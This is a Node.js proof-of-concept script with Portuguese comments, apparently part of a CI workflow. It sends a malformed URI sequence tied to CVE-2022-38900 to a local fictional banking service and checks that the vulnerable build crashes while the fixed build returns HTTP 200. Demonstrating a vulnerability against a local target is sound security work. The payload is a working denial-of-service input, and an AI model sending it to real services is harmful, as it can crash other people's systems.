// Cliente HTTP independente do servidor. A demonstracao usa apenas o servico
// bancario ficticio iniciado localmente pelo workflow.
const [scenario, baseUrl = "http://127.0.0.1:3000"] = process.argv.slice(2);

if (!["vulnerable", "fixed"].includes(scenario)) {
  console.error("[attack] Uso: node scripts/demo-attack.mjs <vulnerable|fixed> [base-url]");
  process.exit(2);
}

// Sequencia malformada registrada no relato da CVE-2022-38900.
const requestPath = "/payment?reference=%ea%ba%5a%ba";
const target = new URL(requestPath, baseUrl);
const timeoutMs = 3_000;
const startedAt = new Date();
const startedMs = Date.now();
let response;
let responseBody = "";
let failure;

console.log("[attack] Inicio da demonstracao externa");
console.log(`[attack] Cenario: ${scenario}`);
console.log(`[attack] Destino: ${target.origin}`);
console.log(`[attack] Requisicao: GET ${target.pathname}${target.search}`);
console.log(`[attack] Timeout do cliente: ${timeoutMs} ms`);
console.log(`[attack] Horario de inicio (UTC): ${startedAt.toISOString()}`);

try {
  // fetch envia uma requisicao HTTP real; o cliente nao importa o pacote testado.
  response = await fetch(target, { signal: AbortSignal.timeout(timeoutMs) });
  responseBody = await response.text();
} catch (error) {
  failure = error;
}

const durationMs = Date.now() - startedMs;
const expectedProcessCrash = scenario === "vulnerable";
const observedConnectionFailure = Boolean(failure);
const expectedHttpResponse = scenario === "fixed" && response?.status === 200;
const clientObservationMatches = expectedProcessCrash
  ? observedConnectionFailure
  : expectedHttpResponse;

if (response) {
  console.log(`[attack] Resposta HTTP: ${response.status} ${response.statusText}`);
  console.log(`[attack] Corpo da resposta: ${responseBody.slice(0, 1000) || "<vazio>"}`);
}
if (failure) {
  console.log(`[attack] A requisicao falhou apos ${durationMs} ms.`);
  console.log(`[attack] Erro: ${failure.stack || failure}`);
} else {
  console.log(`[attack] A requisicao terminou em ${durationMs} ms.`);
}
console.log(`[attack] Resultado esperado: ${expectedProcessCrash ? "conexao interrompida pelo processo vulneravel" : "resposta HTTP 200 do processo corrigido"}`);
console.log(`[attack] Observacao do cliente: ${clientObservationMatches ? "corresponde ao esperado" : "NAO corresponde ao esperado"}`);

const section = [
  `### Demonstracao externa da CVE-2022-38900: ${scenario}`,
  "",
  `- URL enviada: \`${target.href}\``,
  `- Duracao: ${durationMs} ms.`,
  `- Resultado observado: ${failure ? `conexao interrompida (${failure.name})` : `HTTP ${response.status}`}.`,
  `- Resultado esperado: ${expectedProcessCrash ? "o container vulneravel encerra" : "a versao corrigida responde com HTTP 200"}.`,
  `- Observacao do cliente: **${clientObservationMatches ? "corresponde ao esperado" : "inesperada"}**.`,
  ""
].join("\n");

console.log(section);
if (process.env.GITHUB_STEP_SUMMARY) {
  const { appendFile } = await import("node:fs/promises");
  await appendFile(process.env.GITHUB_STEP_SUMMARY, section);
}

// A verificacao definitiva de encerramento e feita pelo workflow via docker inspect.
if (!clientObservationMatches) process.exitCode = 1;
